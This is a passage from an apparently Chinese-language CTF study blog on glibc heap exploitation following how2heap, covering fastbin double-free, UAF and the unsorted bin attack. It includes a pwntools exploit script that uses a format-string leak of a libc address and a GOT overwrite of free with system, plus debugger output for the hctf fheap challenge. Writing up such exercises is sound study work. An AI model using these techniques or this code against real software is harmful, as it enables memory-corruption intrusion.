class=\"number\">2</span>)</div><div class=\"line\">    payload = <span class=\"string\">'%1908x'</span> + <span class=\"string\">'%13$hn'</span> <span class=\"comment\"># 400a39</span></div><div class=\"line\">    payload += <span class=\"string\">'%31$lx'</span></div><div class=\"line\">    payload = payload.ljust(<span class=\"number\">0x80</span>)</div><div class=\"line\">    payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x151</span>)</div><div class=\"line\">    edit1(payload)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'5'</span>.ljust(<span class=\"number\">8</span>, <span class=\"string\">'\\x00'</span>) + p64(<span class=\"number\">0x6011f0</span>)</div><div class=\"line\"><span class=\"comment\">#    payload += '%&#123;&#125;x'.format(39 - len(payload)) + '%13$hhn'</span></div><div class=\"line\">    gdb.attach(p)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    <span class=\"keyword\">print</span> p.recvline()</div><div class=\"line\">    <span class=\"keyword\">print</span> p.recvline()</div><div class=\"line\">    <span class=\"keyword\">print</span> p.recvline()</div><div class=\"line\">    <span class=\"keyword\">print</span> p.recvuntil(<span class=\"string\">'400fda'</span>)</div><div class=\"line\">    leak_addr = int(p.recv(<span class=\"number\">12</span>), <span class=\"number\">16</span>)</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'leak_addr =&gt; '</span>, hex(leak_addr)</div><div class=\"line\">    libc.address = leak_addr - <span class=\"number\">241</span> - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'libc.address =&gt; '</span>, hex(libc.address)</div><div class=\"line\">    system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'system_addr =&gt; '</span>, hex(system_addr)</div><div class=\"line\"></div><div class=\"line\">    dele(<span class=\"number\">2</span>)</div><div class=\"line\">    low_bytes = int(hex(system_addr)[<span class=\"number\">-4</span>:], <span class=\"number\">16</span>)</div><div class=\"line\">    mid_bytes = int(hex(system_addr)[<span class=\"number\">8</span>:<span class=\"number\">10</span>], <span class=\"number\">16</span>)</div><div class=\"line\">    payload = <span class=\"string\">'%&#123;&#125;x'</span>.format(int(hex(system_addr)[<span class=\"number\">8</span>:<span class=\"number\">10</span>], <span class=\"number\">16</span>) - <span class=\"number\">12</span>) + <span class=\"string\">'%13$hhn'</span></div><div class=\"line\">    payload += <span class=\"string\">'%&#123;&#125;x'</span>.format(low_bytes - mid_bytes) + <span class=\"string\">'%14$hn'</span></div><div class=\"line\">    payload = payload.ljust(<span class=\"number\">0x80</span>)</div><div class=\"line\">    payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x151</span>)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    edit1(payload)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'5'</span>.ljust(<span class=\"number\">8</span>, <span class=\"string\">'\\x00'</span>) + p64(free_got+<span class=\"number\">2</span>)</div><div class=\"line\">    payload += p64(free_got)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n<h2 id=\"0x0A-unsorted-bin-attack\"><a href=\"#0x0A-unsorted-bin-attack\" class=\"headerlink\" title=\"0x0A unsorted bin attack\"></a>0x0A unsorted bin attack</h2><p>这个应该是最简单的堆溢出技术了吧，先看当我们释放<code>unsortbin</code>时的源码</p>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">bck = victim-&gt;bk;</div><div class=\"line\">.........</div><div class=\"line\"><span class=\"comment\">/* remove from unsorted list */</span></div><div class=\"line\">unsorted_chunks (av)-&gt;bk = bck;</div><div class=\"line\">bck-&gt;fd = unsorted_chunks (av);</div></pre></td></tr></table></figure>\n<p>并没有使用<code>unlink</code>宏，所以这里不存在检查指针的情况，如果我们修改了<code>victim-&gt;bk</code>的值为<code>fake_addr</code>，那么<code>(av)-&gt;bk</code>也会被修改，同时<code>fake_addr+16 = victim-&gt;bk-&gt;fd = (av)</code>，我们就将一个大的数字写到了<code>fack_addr+16</code>的位置去。但是由于<code>(av)-&gt;bk</code>被破坏了，所以下次再走到这步时可能会出错，具体什么操作出现什么问题还待研究。</p>\n<p>这个看似任意地址写但是不能控制写的内容，所以只能作为其他攻击的准备。how2heap给出的方法时修改<code>global_max_fast</code>，这样我们在剩下分配其他内存时都会以<code>fastbin</code>的方式分配，为<code>fastbin</code>攻击做准备。</p>\n<h3 id=\"例题-2\"><a href=\"#例题-2\" class=\"headerlink\" title=\"例题\"></a>例题</h3><p>这里用给出的20160ctf的ZeroStorage为例<br>Orz我去这程序怎么这么长。。。</p>\n","excerpt":"<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>堆溢出搞了很久，道理我都懂，但是就是在实战中用不起来，只能花功夫一定要在这周把堆溢出啃下来。<br>以<a href=\"https://github.com/shellphish/how2heap\">how2heap</a>为学习路径，step by step，记录下，可能的话，帮助到后来的人。</p>\n<blockquote>\n<table>\n<thead>\n<tr>\n<th>File</th>\n<th>Technique</th>\n<th>Applicable CTF Challenges</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"first_fit.c\">first_fit.c</a></td>\n<td>演示glibc malloc的首次适应(first-fit)行为</td>\n<td></td>\n</tr>\n<tr>\n<td><a href=\"fastbin_dup.c\">fastbin_dup.c</a></td>\n<td>通过操作fastbin已释放的表，来除法malloc以返回已经分配过的堆指针</td>\n<td></td>\n</tr>\n<tr>\n<td><a href=\"fastbin_dup_into_stack.c\">fastbin_dup_into_stack.c</a></td>\n<td>通过操作fastbin的已释放的表，来触发malloc来得到一个几乎任意指向的指针</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine\">9447-search-engine</a></td>\n</tr>\n<tr>\n<td><a href=\"unsafe_unlink.c\">unsafe_unlink.c</a></td>\n<td>Exploiting free on a corrupted chunk to get arbitrary write.</td>\n<td><a href=\"http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/\">HITCON CTF 2014-stkof</a></td>\n</tr>\n<tr>\n<td><a href=\"house_of_spirit.c\">house_of_spirit.c</a></td>\n<td>Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer.</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo\">hack.lu CTF 2014-OREO</a></td>\n</tr>\n<tr>\n<td><a href=\"poison_null_byte.c\">poison_null_byte.c</a></td>\n<td>Exploiting a single null byte overflow.</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb\">PlaidCTF 2015-plaiddb</a></td>\n</tr>\n<tr>\n<td><a href=\"house_of_lore.c\">house_of_lore.c</a></td>\n<td>Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist.</td>\n<td></td>\n</tr>\n<tr>\n<td><a href=\"overlapping_chunks.c\">overlapping_chunks.c</a></td>\n<td>利用覆写已释放在unsortbin链中chunk的size位，去获得一个重叠在已分配chunk的新的分配</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore\">hack.lu CTF 2015-bookstore</a></td>\n</tr>\n<tr>\n<td><a href=\"house_of_force.c\">house_of_force.c</a></td>\n<td>溢出Top chunk头去分配，来得到一个接近任意地址的指针</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6\">Boston Key Party 2016-cookbook</a>, <a href=\"https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200\">BCTF 2016-bcloud</a></td>\n</tr>\n<tr>\n<td><a href=\"unsorted_bin_attack.c\">unsorted_bin_attack.c</a></td>\n<td>利用在unsortbin的freelist链表里的一个已释放chunk的overwrite去在任意地址中写入一个大数</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6\">0ctf 2016-zerostorage</a></td>\n</tr>\n<tr>\n<td><a href=\"house_of_einherjar.c\">house_of_einherjar.c</a></td>\n<td>Exploiting a single null byte overflow to trick malloc into returning a controlled pointer</td>\n<td><a href=\"https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf\">Seccon 2016-tinypad</a></td>\n</tr>\n</tbody>\n</table>\n</blockquote>","more":"<h2 id=\"0x01-first-fit\"><a href=\"#0x01-first-fit\" class=\"headerlink\" title=\"0x01 first fit\"></a>0x01 first fit</h2><p>这里主要提供了一个UAF的使用示例。glibc使用的first-fit算法来选择空间分配，当我们之前释放的chunk足够大时，程序就会最先使用这个chunk。但此时释放的上一个使用此chunk的指针依然指向这个chunk，我们可以通过一个已经free过的指针来控制这个chunk。</p>\n<h2 id=\"0x02-fastbin-dup\"><a href=\"#0x02-fastbin-dup\" class=\"headerlink\" title=\"0x02 fastbin dup\"></a>0x02 fastbin dup</h2><p>fastbin通过一个链表来维护空闲的chunk，当一个chunk被free掉之后，会将这个chunk接回链表的头部，下次申请时会申请这个chunk。</p>\n<h2 id=\"0x03-fastbin-dup-into-stack-double-free\"><a href=\"#0x03-fastbin-dup-into-stack-double-free\" class=\"headerlink\" title=\"0x03 fastbin dup into stack(double-free)\"></a>0x03 fastbin dup into stack(double-free)</h2><p>这个就是double-free的一个利用。<br>当我们<code>malloc</code>一个小于<code>128</code>的堆块的时候，<code>ptmalloc</code>就会调用到<code>fastbin</code>。<code>fastbin</code>是由一个单链表组成的，遵循<code>FIFO</code>原则，由于<code>fastbin</code>在<code>free</code>的时候并不会对指针是否已经释放做检查，所以我们可以构造出一个循环链表的情况。<br>比如：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">int</span> *a = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>) ;</div><div class=\"line\"><span class=\"keyword\">int</span> *b = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</div><div class=\"line\"><span class=\"built_in\">free</span>(a);</div><div class=\"line\"><span class=\"built_in\">free</span>(b);</div></pre></td></tr></table></figure>\n<p>此时维护的一个链表结构为<br><code>[head] -&gt; b -&gt; a -&gt; null</code></p>\n<p>当我们再次</p>\n<p><code>free(a);</code></p>\n<p>此时的链表结构为</p>\n<p><code>[head] -&gt; a -&gt; b -&gt; a -&gt; null</code></p>\n<p>紧接着我们申请两次堆</p>\n<figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">*a = malloc(8);</span></div><div class=\"line\"><span class=\"comment\">*b = malloc(8);</span></div></pre></td></tr></table></figure>\n<p>此时我们维护的链表结构为</p>\n<p><code>[head] -&gt; a -&gt; null</code></p>\n<p>如果我们修改<code>a</code>的前八个字节为我们的希望的地址，当我们两次<code>malloc</code>之后，我们就能得到一个指向任意地址的指针。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">*a = &amp;attribute_addr;</div><div class=\"line\"><span class=\"keyword\">int</span> *c = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);   <span class=\"comment\">//c == a</span></div><div class=\"line\"><span class=\"keyword\">int</span> *d = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);   <span class=\"comment\">// d == attribute_addr</span></div></pre></td></tr></table></figure>\n<p>维护的链表如下</p>\n<figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">[<span class=\"function\"><span class=\"title\">head</span>] -&gt;</span> <span class=\"function\"><span class=\"title\">a</span> -&gt;</span> null</div><div class=\"line\">[<span class=\"function\"><span class=\"title\">head</span>] -&gt;</span> <span class=\"function\"><span class=\"title\">a</span> -&gt;</span> attribute</div><div class=\"line\">[<span class=\"function\"><span class=\"title\">head</span>] -&gt;</span> attribute</div></pre></td></tr></table></figure>\n<p>于是我们就可以得到一个<code>8bit</code>的任意地址写了。</p>\n<p>以下用<em>2016hctf</em>的<code>就是干</code>为例</p>\n<h4 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h4><p>首先分析程序，先查看程序的保护</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2016</span>hctf<span class=\"regexp\">/pwn/</span>fheap$ checksec pwn-f </div><div class=\"line\">[*] <span class=\"string\">'/home/ubuntu/ctf-problem/2016hctf/pwn/fheap/pwn-f'</span></div><div class=\"line\"><span class=\"symbol\">    Arch:</span>     amd64<span class=\"number\">-64</span>-little</div><div class=\"line\"><span class=\"symbol\">    RELRO:</span>    Partial RELRO</div><div class=\"line\"><span class=\"symbol\">    Stack:</span>    Canary found</div><div class=\"line\"><span class=\"symbol\">    NX:</span>       NX enabled</div><div class=\"line\"><span class=\"symbol\">    PIE:</span>      PIE enabled</div></pre></td></tr></table></figure>\n<p>由于程序打开的PIE，我们在gdb调试的时候很不方便，gdb默认是关闭<code>aslr</code>的，但是它会给程序加上一个默认的基地址<code>0x555555554000</code></p>\n<p>这个程序有两个功能：</p>\n<ol>\n<li>添加字符串</li>\n<li>删除一个字符串</li>\n</ol>\n<p>其中，存储字符串的结构题如下：</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">00000000</span> info            struc ; (sizeof=<span class=\"number\">0x20</span>, mappedto_1)</div><div class=\"line\"><span class=\"number\">00000000</span> content         db <span class=\"number\">16</span> dup(?)            ; <span class=\"type\">string</span>(C)</div><div class=\"line\"><span class=\"number\">00000010</span> size            dq ?</div><div class=\"line\"><span class=\"number\">00000018</span> DestroyFunc      dq ?                    ; 这里是程序的调用的free函数的地址</div><div class=\"line\"><span class=\"number\">00000020</span> info            ends</div><div class=\"line\"></div><div class=\"line\">struct info&#123;</div><div class=\"line\">\tchar cintent[<span class=\"number\">16</span>];</div><div class=\"line\">    int size;</div><div class=\"line\">    void* DestroyFunc;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<p>当我们申请小于15字节的长度时，字符串会直接保存在<code>info.content</code>中。当我们申请长度大于15的字符串的时候，程序会另外申请一个字符串大小的堆，同时这个堆的地址保存在原本的<code>info.content</code>中</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> ( nbytesa &gt; <span class=\"number\">15</span> )</div><div class=\"line\">&#123;</div><div class=\"line\">  dest = (char *)malloc(nbytesa);</div><div class=\"line\">  <span class=\"keyword\">if</span> ( !dest )</div><div class=\"line\">  &#123;</div><div class=\"line\">    puts(<span class=\"string\">\"malloc faild!\"</span>);</div><div class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"number\">1</span>);</div><div class=\"line\">  &#125;</div><div class=\"line\">  strncpy(dest, &amp;buf, nbytesa);</div><div class=\"line\">  *(_QWORD *)ptr = dest;</div><div class=\"line\">  *((_QWORD *)ptr + <span class=\"number\">3</span>) = sub_D6C;           <span class=\"regexp\">//</span> free(*content)</div><div class=\"line\">                                            <span class=\"regexp\">//</span> free(content)</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"keyword\">else</span></div><div class=\"line\">&#123;</div><div class=\"line\">  strncpy(ptr, &amp;buf, nbytesa);</div><div class=\"line\">  *((_QWORD *)ptr + <span class=\"number\">3</span>) = sub_D52;           <span class=\"regexp\">//</span> free(content)</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>小于15时堆内存分布<br><figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; x/<span class=\"number\">6</span>xg <span class=\"number\">0</span>x5<span class=\"number\">55555757000</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757000</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000000</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000031</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757010</span>:\t<span class=\"number\">0</span>x000<span class=\"number\">0000061616161</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000000</span>           // content</div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757020</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000004</span>\t<span class=\"number\">0</span>x00005<span class=\"number\">55555554d52</span>           // size + DestroyFunc</div></pre></td></tr></table></figure></p>\n<p>大于15时堆内存的分布情况<br><figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; x/<span class=\"number\">6</span>xg <span class=\"number\">0</span>x5<span class=\"number\">55555757060</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757060</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000000</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000021</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757070</span>:\t<span class=\"number\">0</span>x6<span class=\"number\">161616161616161</span>\t<span class=\"number\">0</span>x6262<span class=\"number\">626262626161</span>           // content</div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757080</span>:\t<span class=\"number\">0</span>x0000000<span class=\"number\">00a626262</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000020f81</span></div><div class=\"line\">pwndbg&gt; x/<span class=\"number\">6</span>xg <span class=\"number\">0</span>x5<span class=\"number\">55555757030</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757030</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000000</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000031</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757040</span>:\t<span class=\"number\">0</span>x00005<span class=\"number\">55555757070</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000000</span>          // new malloc addr</div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757050</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000014</span>\t<span class=\"number\">0</span>x0000555555554d6c          // size +  DestroyFunc</div></pre></td></tr></table></figure></p>\n<p>再来看一下全局变量的堆管理情况</p>\n<figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; telescope <span class=\"number\">0</span>x5<span class=\"number\">55555554000</span>+<span class=\"number\">0x2020C0</span></div><div class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560c0</span> (__bss_start+<span class=\"number\">32</span>) ◂— <span class=\"number\">0</span>x1</div><div class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560c8</span> (__bss_start+<span class=\"number\">40</span>) —▸ <span class=\"number\">0</span>x5<span class=\"number\">55555757010</span> ◂— <span class=\"number\">0x61616161</span> /* 'aaaa' */</div><div class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560d0</span> (__bss_start+<span class=\"number\">48</span>) ◂— <span class=\"number\">0</span>x1</div><div class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560d8</span> (__bss_start+<span class=\"number\">56</span>) —▸ <span class=\"number\">0</span>x5<span class=\"number\">55555757040</span> —▸ <span class=\"number\">0</span>x5<span class=\"number\">55555757070</span> ◂— 'aaaaaaaaaabbbbb...'</div><div class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560e0</span> (__bss_start+<span class=\"number\">64</span>) ◂— <span class=\"number\">0</span>x1</div><div class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560e8</span> (__bss_start+<span class=\"number\">72</span>) —▸ <span class=\"number\">0</span>x5<span class=\"number\">55555757090</span> —▸ <span class=\"number\">0</span>x55<span class=\"number\">55557570c0</span> ◂— 'ccc\\naaaaaabbbbb...'</div><div class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560f0</span> (__bss_start+<span class=\"number\">80</span>) ◂— <span class=\"number\">0</span>x0</div><div class=\"line\">... ↓</div><div class=\"line\">pwndbg&gt; x/<span class=\"number\">6</span>xg <span class=\"number\">0</span>x5<span class=\"number\">55555554000</span>+<span class=\"number\">0x2020C0</span></div><div class=\"line\"><span class=\"number\">0</span>x55<span class=\"number\">55557560c0</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000001</span>\t<span class=\"number\">0</span>x00005<span class=\"number\">55555757010</span></div><div class=\"line\"><span class=\"number\">0</span>x55<span class=\"number\">55557560d0</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000001</span>\t<span class=\"number\">0</span>x00005<span class=\"number\">55555757040</span></div><div class=\"line\"><span class=\"number\">0</span>x55<span class=\"number\">55557560e0</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000001</span>\t<span class=\"number\">0</span>x00005<span class=\"number\">55555757090</span></div></pre></td></tr></table></figure>\n<p>堆管理结构中，前一个为表示是否占用，后一个表示字符串的地址。</p>\n<p>看一下删除操作的函数实现：<br><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">if ( <span class=\"name\">*</span>((<span class=\"name\">_QWORD</span> *)&amp;manage + 2 * v1 + <span class=\"number\">1</span>) )</div><div class=\"line\">  &#123;</div><div class=\"line\">    printf(<span class=\"string\">\"Are you sure?:\"</span>)<span class=\"comment\">;</span></div><div class=\"line\">    read(<span class=\"number\">0</span>, <span class=\"symbol\">&amp;buf</span>, <span class=\"number\">0</span>x100uLL)<span class=\"comment\">;</span></div><div class=\"line\">    if ( !strncmp(<span class=\"name\">&amp;buf</span>, <span class=\"string\">\"yes\"</span>, <span class=\"number\">3</span>uLL) )</div><div class=\"line\">    &#123;</div><div class=\"line\">      (<span class=\"name\">*</span>(<span class=\"name\">void</span> (<span class=\"name\">__fastcall</span> **)(<span class=\"name\">_QWORD</span>, const char *))(*((<span class=\"name\">_QWORD</span> *)&amp;manage + 2 * v1 + <span class=\"number\">1</span>) + <span class=\"number\">24</span>LL))(</div><div class=\"line\">        <span class=\"name\">*</span>((<span class=\"name\">_QWORD</span> *)&amp;manage + 2 * v1 + <span class=\"number\">1</span>),</div><div class=\"line\">        <span class=\"string\">\"yes\"</span>)<span class=\"comment\">;</span></div><div class=\"line\">      *((_DWORD *)<span class=\"symbol\">&amp;manage</span> + <span class=\"number\">4</span> * v1) = 0;</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div></pre></td></tr></table></figure></p>\n<p>官方的源码如下：<br><figure class=\"highlight objectivec\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">void</span> deleteStr() &#123;</div><div class=\"line\">    <span class=\"keyword\">int</span> <span class=\"keyword\">id</span>;</div><div class=\"line\">\t<span class=\"keyword\">char</span> buf[<span class=\"number\">0x100</span>];</div><div class=\"line\">    printf(<span class=\"string\">\"Pls give me the string id you want to delete\\nid:\"</span>);</div><div class=\"line\">    <span class=\"keyword\">id</span> = getInt();</div><div class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">id</span> &lt; <span class=\"number\">0</span> || <span class=\"keyword\">id</span> &gt; <span class=\"number\">0x10</span>) &#123;</div><div class=\"line\">        printf(<span class=\"string\">\"Invalid id\\n\"</span>);</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">if</span> (Strings[<span class=\"keyword\">id</span>].str) &#123;</div><div class=\"line\">\t\tprintf(<span class=\"string\">\"Are you sure?:\"</span>);</div><div class=\"line\">\t\tread(STDIN_FILENO,buf,<span class=\"number\">0x100</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span>(strncmp(buf,<span class=\"string\">\"yes\"</span>,<span class=\"number\">3</span>)) &#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">        Strings[<span class=\"keyword\">id</span>].str-&gt;free(Strings[<span class=\"keyword\">id</span>].str);</div><div class=\"line\">        Strings[<span class=\"keyword\">id</span>].inuse = <span class=\"number\">0</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>这里存在一个漏洞，程序检查的是字符串的结构体指针是否为0，但事实上是不可能为0的。同时利用<code>fastbin</code>不会检查是否已释放的特点，我们可以构造<code>double-free</code>那么我们就可以利用这一点，如果在结构体调用的<code>DestroyFunc</code>覆盖为其他函数，我们就可以造成任意函数执行。如果我们将堆上的函数覆盖位<code>puts</code>时，程序将会执行<code>puts(contents)</code>而不是<code>free(content)</code>，通过适当<code>content</code>，我们可以泄露程序基址。<br>在结构体的<code>DestroyFunc</code>部分，即使开了<code>PIE</code>，程序的最后三位也是不变的，我们只需要覆盖最后3位或2位即可。</p>\n<p>所以总结，此题的漏洞点在<code>UAF</code>&amp;<code>double-free</code>。<br>ecp:</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div 